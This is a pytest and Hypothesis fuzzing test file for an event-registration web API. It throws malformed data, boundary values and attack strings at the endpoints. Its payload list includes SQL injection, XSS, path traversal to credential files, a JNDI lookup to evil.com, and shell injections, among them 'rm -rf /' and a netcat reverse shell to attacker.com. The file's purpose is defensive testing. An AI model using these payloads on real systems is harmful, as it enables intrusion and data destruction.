"""
Fuzzing tests for input validation and error handling systems.

Uses property-based testing and fuzzing techniques to discover edge cases
and validation vulnerabilities across the application.
"""

import uuid
import json
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock
from decimal import Decimal
import sys

import pytest
from hypothesis import given, strategies as st, settings, assume
from fastapi import status

from app.models import AttendeeCategory, EventStatus
from tests.fixtures.faker_providers import setup_faker_providers


# Custom fuzzing strategies
@st.composite
def malformed_json_strategy(draw):
    """Generate malformed JSON data for fuzzing."""
    base_data = draw(st.dictionaries(
        st.text(min_size=1, max_size=20),
        st.one_of(
            st.none(),
            st.booleans(),
            st.integers(),
            st.floats(allow_nan=True, allow_infinity=True),
            st.text(),
            st.lists(st.integers(), min_size=0, max_size=5)
        ),
        min_size=1,
        max_size=10
    ))
    
    # Sometimes add malformed elements
    corruption_type = draw(st.sampled_from([
        "circular_reference",
        "deep_nesting",
        "large_numbers",
        "unicode_chaos",
        "null_bytes"
    ]))
    
    if corruption_type == "deep_nesting":
        # Create deeply nested structure
        nested = base_data
        for _ in range(draw(st.integers(min_value=10, max_value=100))):
            nested = {"nested": nested}
        return nested
    elif corruption_type == "large_numbers":
        base_data["large_number"] = draw(st.integers(min_value=2**63, max_value=2**100))
        return base_data
    elif corruption_type == "unicode_chaos":
        base_data["unicode_chaos"] = draw(st.text(
            alphabet=st.characters(
                whitelist_categories=('Cc', 'Cf', 'Cs', 'Co', 'Cn', 'Lm', 'Mn'),
                max_codepoint=0x10FFFF
            ),
            min_size=1,
            max_size=100
        ))
        return base_data
    elif corruption_type == "null_bytes":
        base_data["null_bytes"] = f"data\x00with\x00nulls"
        return base_data
    
    return base_data


@st.composite
def boundary_value_strategy(draw):
    """Generate boundary values for numeric inputs."""
    return draw(st.sampled_from([
        -1, 0, 1,
        127, 128, 129,           # signed byte boundaries
        255, 256, 257,           # unsigned byte boundaries  
        32767, 32768, 32769,     # signed short boundaries
        65535, 65536, 65537,     # unsigned short boundaries
        2147483647, 2147483648,  # signed int boundaries
        4294967295, 4294967296,  # unsigned int boundaries
        9223372036854775807,     # max long
        -9223372036854775808,    # min long
        float('inf'), float('-inf'), float('nan'),
        1e308, -1e308,           # float boundaries
        sys.maxsize, -sys.maxsize - 1
    ]))


@st.composite
def malicious_string_strategy(draw):
    """Generate strings with malicious patterns."""
    pattern_type = draw(st.sampled_from([
        "sql_injection",
        "xss_payload", 
        "command_injection",
        "path_traversal",
        "format_string",
        "buffer_overflow",
        "unicode_attack"
    ]))
    
    patterns = {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
            "'; DELETE FROM events WHERE 1=1; --",
            "admin'--",
            "' OR 1=1#",
        ],
        "xss_payload": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
        ],
        "command_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "; nc -e /bin/sh attacker.com 4444",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ],
        "format_string": [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "{0}{1}{2}{3}{4}{5}",
            "{{7*7}}",
            "${jndi:ldap://evil.com/exploit}",
        ],
        "buffer_overflow": [
            "A" * 1000,
            "A" * 10000,
            "A" * 100000,
        ],
        "unicode_attack": [
            "\ufeff" + "normal text",  # BOM
            "\u202e" + "text",         # Right-to-left override
            "\u0000" + "null byte",
            "\r\n" + "CRLF injection",
        ]
    }
    
    return draw(st.sampled_from(patterns[pattern_type]))


@pytest.mark.fuzzing
class TestInputValidationFuzzing:
    """Fuzzing tests for input validation across API endpoints."""
    
    @given(malformed_data=malformed_json_strategy())
    @settings(max_examples=100, deadline=10000)
    def test_event_creation_input_fuzzing(self, client, malformed_data):
        """Fuzz event creation endpoint with malformed data."""
        with patch("app.auth.current_active_organizer") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.is_organizer = True
            mock_auth.return_value = mock_user
            
            try:
                response = client.post("/events/", json=malformed_data)
                
                # Should handle malformed input gracefully
                assert response.status_code in [
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_422_UNPROCESSABLE_ENTITY,
                    status.HTTP_500_INTERNAL_SERVER_ERROR
                ]
                
                # Should not crash or expose internal information
                if response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR:
                    error_text = response.text.lower()
                    # Should not expose stack traces or internal paths
                    sensitive_info = [
                        "traceback", "/home/", "/usr/", "sqlalchemy",
                        "internal server error", "exception"
                    ]
                    for info in sensitive_info:
                        assert info not in error_text
                        
            except Exception as e:
                # Should not raise unhandled exceptions
                pytest.fail(f"Unhandled exception with input {malformed_data}: {e}")
    
    @given(
        field_name=st.sampled_from([
            "name", "email", "display_name", "bio", "description", 
            "location", "dietary_requirements"
        ]),
        malicious_value=malicious_string_strategy()
    )
    @settings(max_examples=50, deadline=8000)
    def test_string_field_injection_fuzzing(self, client, field_name, malicious_value):
        """Fuzz string fields with injection attack patterns."""
        with patch("app.auth.current_active_user") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_auth.return_value = mock_user
            
            # Test attendee registration with malicious string
            event_id = uuid.uuid4()
            registration_data = {
                "display_name": "Test User",
                "category": AttendeeCategory.SINGLE_WOMAN.value,
                "contact_email": "test@example.com",
                field_name: malicious_value
            }
            
            try:
                response = client.post(
                    f"/attendees/register/{event_id}",
                    json=registration_data
                )
                
                # Should sanitize or reject malicious input
                if response.status_code == status.HTTP_201_CREATED:
                    response_data = response.json()
                    stored_value = response_data.get(field_name, "")
                    
                    if isinstance(stored_value, str):
                        # Check that dangerous patterns are sanitized
                        dangerous_patterns = [
                            "<script>", "DROP TABLE", "'; DELETE",
                            "javascript:", "onerror=", "onload="
                        ]
                        
                        for pattern in dangerous_patterns:
                            assert pattern.lower() not in stored_value.lower(), \
                                f"Dangerous pattern '{pattern}' found in response"
                else:
                    # Rejection is acceptable
                    assert response.status_code in [
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_422_UNPROCESSABLE_ENTITY
                    ]
                    
            except Exception as e:
                pytest.fail(f"Unhandled exception with {field_name}={malicious_value}: {e}")
    
    @given(
        numeric_value=boundary_value_strategy()
    )
    @settings(max_examples=30, deadline=5000)
    def test_numeric_field_boundary_fuzzing(self, client, numeric_value):
        """Fuzz numeric fields with boundary values."""
        with patch("app.auth.current_active_organizer") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.is_organizer = True
            mock_auth.return_value = mock_user
            
            # Test numeric boundaries in event creation
            event_data = {
                "name": "Test Event",
                "event_date": (datetime.now() + timedelta(days=7)).isoformat(),
                "max_attendees": numeric_value,
                "min_attendees": 10,
                "round_duration_minutes": 5
            }
            
            try:
                response = client.post("/events/", json=event_data)
                
                # Should handle boundary values gracefully
                if response.status_code not in [
                    status.HTTP_201_CREATED,
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_422_UNPROCESSABLE_ENTITY
                ]:
                    # Should not cause server errors
                    assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR
                    
            except (ValueError, OverflowError, TypeError):
                # These exceptions are acceptable for boundary values
                pass
            except Exception as e:
                pytest.fail(f"Unexpected exception with numeric value {numeric_value}: {e}")
    
    @given(
        uuid_value=st.one_of(
            st.text(min_size=1, max_size=100),
            st.integers(),
            st.floats(),
            st.none(),
            st.lists(st.text(), min_size=1, max_size=3)
        )
    )
    @settings(max_examples=40, deadline=6000)
    def test_uuid_field_format_fuzzing(self, client, uuid_value):
        """Fuzz UUID fields with various malformed values."""
        with patch("app.auth.current_active_organizer") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.is_organizer = True
            mock_auth.return_value = mock_user
            
            # Test malformed UUID in path parameter
            try:
                response = client.get(f"/events/{uuid_value}")
                
                # Should handle malformed UUIDs gracefully
                assert response.status_code in [
                    status.HTTP_404_NOT_FOUND,
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_422_UNPROCESSABLE_ENTITY
                ]
                
                # Should not expose internal error details
                if response.status_code >= 400:
                    error_text = response.text.lower()
                    assert "uuid" in error_text or "not found" in error_text
                    
            except Exception as e:
                pytest.fail(f"Unhandled exception with UUID value {uuid_value}: {e}")


@pytest.mark.fuzzing
class TestErrorHandlingFuzzing:
    """Fuzzing tests for error handling robustness."""
    
    @given(
        content_type=st.sampled_from([
            "application/xml",
            "text/plain", 
            "application/octet-stream",
            "multipart/form-data",
            "application/x-www-form-urlencoded",
            "text/html",
            "invalid/content-type",
            ""
        ])
    )
    @settings(max_examples=20, deadline=5000)
    def test_content_type_fuzzing(self, client, content_type):
        """Fuzz endpoints with unexpected content types."""
        headers = {"Content-Type": content_type}
        test_data = b"random binary data \x00\xFF\xFE"
        
        endpoints = [
            ("/events/", "POST"),
            ("/auth/jwt/login", "POST"),
            ("/attendees/register/" + str(uuid.uuid4()), "POST")
        ]
        
        for endpoint, method in endpoints:
            try:
                response = client.request(
                    method=method,
                    url=endpoint,
                    content=test_data,
                    headers=headers
                )
                
                # Should handle unexpected content types gracefully
                assert response.status_code in [
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_415_UNSUPPORTED_MEDIA_TYPE,
                    status.HTTP_422_UNPROCESSABLE_ENTITY,
                    status.HTTP_401_UNAUTHORIZED,  # For auth endpoints
                    status.HTTP_403_FORBIDDEN,     # For protected endpoints
                ]
                
            except Exception as e:
                pytest.fail(f"Unhandled exception with content-type {content_type}: {e}")
    
    @given(
        header_value=st.one_of(
            st.text(min_size=1000, max_size=10000),  # Very long headers
            st.binary(min_size=100, max_size=1000),   # Binary data
            malicious_string_strategy(),              # Malicious patterns
            st.text(alphabet=st.characters(max_codepoint=0x10FFFF), min_size=10, max_size=100)
        )
    )
    @settings(max_examples=25, deadline=6000)  
    def test_http_header_fuzzing(self, client, header_value):
        """Fuzz HTTP headers with malicious or malformed values."""
        headers = {
            "User-Agent": header_value,
            "X-Forwarded-For": header_value,
            "Authorization": f"Bearer {header_value}",
            "Cookie": f"session={header_value}"
        }
        
        try:
            response = client.get("/", headers=headers)
            
            # Should handle malformed headers gracefully
            assert response.status_code in [
                status.HTTP_200_OK,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_401_UNAUTHORIZED,
                status.HTTP_403_FORBIDDEN
            ]
            
        except Exception as e:
            # Some header fuzzing may cause connection errors, which is acceptable
            if "connection" not in str(e).lower():
                pytest.fail(f"Unexpected exception with header value: {e}")
    
    @given(
        query_param=st.dictionaries(
            st.text(min_size=1, max_size=50),
            st.one_of(
                malicious_string_strategy(),
                boundary_value_strategy().map(str),
                st.lists(st.text(), min_size=1, max_size=5)
            ),
            min_size=1,
            max_size=10
        )
    )
    @settings(max_examples=30, deadline=8000)
    def test_query_parameter_fuzzing(self, client, query_param):
        """Fuzz query parameters with various attack patterns."""
        with patch("app.auth.current_active_organizer") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.is_organizer = True
            mock_auth.return_value = mock_user
            
            try:
                response = client.get("/events/", params=query_param)
                
                # Should handle malicious query parameters
                assert response.status_code in [
                    status.HTTP_200_OK,
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_422_UNPROCESSABLE_ENTITY
                ]
                
                # Should not expose SQL errors or internal information
                if response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR:
                    error_text = response.text.lower()
                    sql_keywords = ["sql", "database", "table", "syntax error"]
                    for keyword in sql_keywords:
                        assert keyword not in error_text
                        
            except Exception as e:
                pytest.fail(f"Unhandled exception with query params {query_param}: {e}")


@pytest.mark.fuzzing
class TestValidationErrorHandling:
    """Test error handling in validation systems."""
    
    @given(
        datetime_string=st.one_of(
            st.text(min_size=1, max_size=100),
            st.integers(),
            st.floats(),
            st.sampled_from([
                "not-a-date",
                "2024-02-30T25:61:61",  # Invalid date/time
                "9999-12-31T23:59:59",  # Far future
                "1900-01-01T00:00:00",  # Far past
                "",
                "null",
                "undefined"
            ])
        )
    )
    @settings(max_examples=25, deadline=5000)
    def test_datetime_validation_fuzzing(self, client, datetime_string):
        """Fuzz datetime validation with malformed date strings."""
        with patch("app.auth.current_active_organizer") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.is_organizer = True  
            mock_auth.return_value = mock_user
            
            event_data = {
                "name": "Test Event",
                "event_date": datetime_string,
                "max_attendees": 50,
                "min_attendees": 10
            }
            
            try:
                response = client.post("/events/", json=event_data)
                
                # Should handle malformed dates gracefully
                if not isinstance(datetime_string, str) or "2024" not in str(datetime_string):
                    assert response.status_code in [
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_422_UNPROCESSABLE_ENTITY
                    ]
                    
            except Exception as e:
                pytest.fail(f"Unhandled exception with datetime {datetime_string}: {e}")
    
    @given(
        email_string=st.one_of(
            malicious_string_strategy(),
            st.text(min_size=1, max_size=1000),
            st.sampled_from([
                "not-an-email",
                "@domain.com",
                "user@",
                "user@@domain.com",
                "user@domain.",
                "user@.domain.com",
                "very.long.email@" + "a" * 500 + ".com",
                "user+tag@domain.com",
                "user@localhost",
                "user@127.0.0.1"
            ])
        )
    )
    @settings(max_examples=30, deadline=6000)
    def test_email_validation_fuzzing(self, client, email_string):
        """Fuzz email validation with malformed email addresses."""
        registration_data = {
            "email": email_string,
            "password": "StrongPassword123!",
            "is_active": True,
            "is_verified": False
        }
        
        try:
            response = client.post("/auth/register", json=registration_data)
            
            # Should validate email format
            if "@" not in str(email_string) or len(str(email_string)) > 320:
                assert response.status_code in [
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_422_UNPROCESSABLE_ENTITY
                ]
                
        except Exception as e:
            pytest.fail(f"Unhandled exception with email {email_string}: {e}")
    
    @given(
        enum_value=st.one_of(
            st.text(min_size=1, max_size=50),
            st.integers(),
            st.floats(),
            st.none(),
            malicious_string_strategy()
        )
    )
    @settings(max_examples=25, deadline=5000)
    def test_enum_validation_fuzzing(self, client, enum_value):
        """Fuzz enum validation with invalid enum values."""
        with patch("app.auth.current_active_user") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_auth.return_value = mock_user
            
            registration_data = {
                "display_name": "Test User",
                "category": enum_value,  # Should be AttendeeCategory enum
                "contact_email": "test@example.com"
            }
            
            event_id = uuid.uuid4()
            
            try:
                response = client.post(
                    f"/attendees/register/{event_id}",
                    json=registration_data
                )
                
                # Should validate enum values
                valid_categories = [cat.value for cat in AttendeeCategory]
                if enum_value not in valid_categories:
                    assert response.status_code in [
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_422_UNPROCESSABLE_ENTITY
                    ]
                    
            except Exception as e:
                pytest.fail(f"Unhandled exception with enum value {enum_value}: {e}")


@pytest.mark.fuzzing
class TestConcurrentFuzzing:
    """Test system behavior under concurrent malformed requests."""
    
    @pytest.mark.slow
    def test_concurrent_malformed_requests(self, client, faker_instance):
        """Test system resilience under concurrent malformed requests."""
        fake = setup_faker_providers(faker_instance)
        
        import concurrent.futures
        import random
        
        def send_malformed_request():
            """Send a malformed request to a random endpoint."""
            endpoints = [
                ("/events/", "POST", {"malformed": "data"}),
                ("/auth/jwt/login", "POST", {"invalid": "credentials"}),
                (f"/attendees/{fake.uuid4()}", "GET", None),
                ("/qr/validate/" + fake.uuid4(), "GET", None)
            ]
            
            endpoint, method, data = random.choice(endpoints)
            
            try:
                if method == "POST":
                    return client.post(endpoint, json=data)
                else:
                    return client.get(endpoint)
            except Exception:
                return None  # Connection errors are acceptable under load
        
        # Submit concurrent malformed requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(send_malformed_request) for _ in range(50)]
            responses = [f.result() for f in futures if f.result() is not None]
        
        # System should remain stable
        assert len(responses) > 0, "System appears to have crashed under load"
        
        # Should handle all requests with appropriate error codes
        server_errors = [
            r for r in responses 
            if r.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
        ]
        
        # Should minimize internal server errors
        error_rate = len(server_errors) / len(responses)
        assert error_rate < 0.5, f"Too many server errors: {error_rate:.2%}"


# Utility functions for fuzzing
def is_dangerous_content(text: str) -> bool:
    """Check if text contains potentially dangerous content patterns."""
    dangerous_patterns = [
        "<script>", "javascript:", "data:", "vbscript:",
        "DROP TABLE", "DELETE FROM", "'; --", "UNION SELECT",
        "../../", "..\\..\\", "%2e%2e%2f",
        "`", "$(", "${", "eval(", "exec("
    ]
    
    text_lower = text.lower()
    return any(pattern.lower() in text_lower for pattern in dangerous_patterns)


def measure_response_time(func, *args, **kwargs):
    """Measure response time for fuzzing performance tests."""
    import time
    start = time.perf_counter()
    result = func(*args, **kwargs)
    end = time.perf_counter()
    return result, (end - start) * 1000  # Return result and time in ms


# Test configuration for fuzzing
pytestmark = [
    pytest.mark.fuzzing,
    pytest.mark.slow,  # Fuzzing tests can be slow
]